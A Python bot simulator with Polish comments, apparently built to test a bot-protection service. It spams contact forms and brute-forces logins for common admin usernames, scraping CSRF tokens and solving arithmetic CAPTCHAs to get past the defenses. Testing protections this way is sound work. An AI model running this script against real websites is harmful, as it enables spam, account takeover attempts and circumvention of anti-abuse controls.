import os
import re
import time
import random
import string
import operator
import threading
import logging
import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")
logger = logging.getLogger(__name__)

TARGET_URL = os.getenv("TARGET_URL", "http://ai-protection-svc:8000")
RPS = float(os.getenv("REQUESTS_PER_SECOND", "2.0"))
ATTACK_TYPE = os.getenv("ATTACK_TYPE", "form_spam")
THREAD_COUNT = int(os.getenv("THREAD_COUNT", "1"))
# True  → bot pobiera CSRF token i rozwiązuje CAPTCHA przed każdym POST
# False → naiwny bot, wysyła POST bez tokenów (zostanie odrzucony przez webapp)
BYPASS_PROTECTION = os.getenv("BYPASS_PROTECTION", "true").lower() == "true"

_OPS = {"+": operator.add, "-": operator.sub, "*": operator.mul}

_CSRF_RE = re.compile(r'name="csrf_token"\s+value="([a-f0-9]+)"')
_CAPTCHA_RE = re.compile(r'id="captcha-q">(\d+)\s*([+\-*])\s*(\d+)<')


def _rand(n=8) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=n))


def _email() -> str:
    return f"{_rand()}@{_rand()}.com"


def _fetch_tokens(session: requests.Session) -> dict:
    """GET strony głównej → wyciąga CSRF token i rozwiązuje CAPTCHA.
    Symuluje zachowanie zaawansowanego bota, który:
      1. Pobiera stronę jak przeglądarka
      2. Parsuje HTML w poszukiwaniu tokenów
      3. Rozwiązuje matematyczne CAPTCHA
    """
    resp = session.get(f"{TARGET_URL}/", timeout=5)
    resp.raise_for_status()
    html = resp.text

    csrf_match = _CSRF_RE.search(html)
    captcha_match = _CAPTCHA_RE.search(html)

    if not csrf_match or not captcha_match:
        raise ValueError("Nie znaleziono tokenów w HTML")

    csrf_token = csrf_match.group(1)
    a, op_sym, b = int(captcha_match.group(1)), captcha_match.group(2), int(captcha_match.group(3))
    captcha_answer = _OPS[op_sym](a, b)

    logger.debug(f"CSRF={csrf_token[:8]}… CAPTCHA={a}{op_sym}{b}={captcha_answer}")
    return {"csrf_token": csrf_token, "captcha_answer": str(captcha_answer)}


def _post(session: requests.Session, path: str, data: dict) -> int:
    """Wykonuje atak: GET (po tokeny) → POST (z tokenami lub bez)."""
    try:
        if BYPASS_PROTECTION:
            tokens = _fetch_tokens(session)
            data = {**data, **tokens}
        resp = session.post(f"{TARGET_URL}{path}", data=data, timeout=5)
        return resp.status_code
    except Exception as e:
        logger.warning(f"błąd {path}: {e}")
        return 0


def spam_contact(sess: requests.Session):
    while True:
        code = _post(sess, "/contact", {
            "name": _rand(10),
            "email": _email(),
            "message": " ".join(_rand(6) for _ in range(8)),
        })
        logger.info(f"contact → {code}")
        time.sleep(1.0 / RPS)


def bruteforce_login(sess: requests.Session):
    usernames = ["admin", "root", "user", "test", "guest", "administrator"]
    while True:
        code = _post(sess, "/login", {
            "username": random.choice(usernames),
            "password": _rand(10),
        })
        logger.info(f"login → {code}")
        time.sleep(1.0 / RPS)


def mixed(sess: requests.Session):
    random.choice([spam_contact, bruteforce_login])(sess)


ATTACKS = {
    "form_spam": spam_contact,
    "login_bruteforce": bruteforce_login,
    "mixed": mixed,
}


def _worker(fn):
    # Każdy wątek ma własną sesję HTTP → własne ciasteczka, własny CSRF token
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": "python-requests/2.32",
        "Accept-Encoding": "gzip, deflate",
    })
    fn(sess)


def main():
    fn = ATTACKS.get(ATTACK_TYPE, spam_contact)
    mode = "bypass (CSRF+CAPTCHA)" if BYPASS_PROTECTION else "naiwny (bez tokenów)"
    logger.info(f"Start | typ={ATTACK_TYPE} | tryb={mode} | wątki={THREAD_COUNT} | rps={RPS}")

    threads = [
        threading.Thread(target=_worker, args=(fn,), name=f"bot-{i}", daemon=True)
        for i in range(THREAD_COUNT)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
